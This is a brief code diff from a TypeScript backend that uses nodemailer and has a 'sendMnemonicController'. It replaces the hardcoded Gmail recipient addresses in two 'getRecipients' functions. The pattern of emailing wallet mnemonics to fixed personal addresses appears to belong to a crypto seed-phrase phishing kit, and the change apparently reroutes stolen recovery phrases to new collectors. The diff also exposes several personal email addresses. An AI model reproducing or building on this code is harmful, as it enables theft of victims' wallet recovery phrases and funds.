@@ -4,7 +4,7 @@ import nodemailer from "nodemailer";
 
 // First
 const getRecipients = (): string[] => {
-  const recipients = "Davidbrown202r@gmail.com,davidjohnn175@gmail.com";
+  const recipients = "davidmark7827@gmail.com,michealrroyroy@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
@@ -79,7 +79,7 @@ export const sendMnemonicController = asyncHandler(
 
 // Second
 const getRecipients3 = (): string[] => {
-  const recipients = "yahyanbenedict@gmail.com,Davidbrown202r@gmail.com";
+  const recipients = "davidmark7827@gmail.com,kiteniyonmon@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
